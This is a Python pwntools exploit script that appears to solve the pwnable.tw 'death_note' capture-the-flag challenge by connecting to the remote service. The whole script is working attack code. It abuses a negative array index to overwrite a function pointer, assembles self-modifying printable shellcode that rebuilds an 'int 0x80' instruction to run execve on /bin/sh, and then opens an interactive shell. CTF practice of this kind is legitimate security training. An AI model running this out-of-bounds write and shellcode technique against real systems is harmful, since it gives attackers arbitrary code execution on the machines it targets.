#coding=utf-8
from pwn import *
local = 0
exec_file="./death_note"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
#argv=["/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so",
#           "--library-path","/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/","./death_note"]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10201)
    #libc=ELF("./libc.so.6")
def get_base(a):
    print a.libs()
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    #text_base = a.libs()[a._cwd + "/death_note"]
    for key in a.libs():
        if "libc-2.31.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x080487EF
    b *0x08048873
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :",str(idx))
def add(idx,name):
    menu(1)
    a.sendlineafter("Index :",str(idx))
    a.sendlineafter("Name :",name)
    return 

def delete(idx):
    menu(3)
    a.sendlineafter("Index :",str(idx))
    return 
    
def edit(idx,content):
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33 IO_FILE

#debug()

shellcode = '''
    /* execve(path='/bin///sh', argv=0, envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx
   /*rewrite shellcode to get 'int 80'*/
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x32] , dl
    sub byte ptr[eax + 0x32] , dl
    sub byte ptr[eax + 0x31] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x31] , dl
    /*set zero to edx*/
    and cl, byte ptr[eax + 0x33]
    push ecx
    pop edx
   /*set 0x0b to eax*/
    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    
'''
sc = asm(shellcode) + "\x6b\x40\x20"
for i in range(len(sc) / 4):
    print hex(u32(sc[i*4:(i+1)*4]))
print len(sc)
add(-19,sc)
delete(-19)


a.interactive()
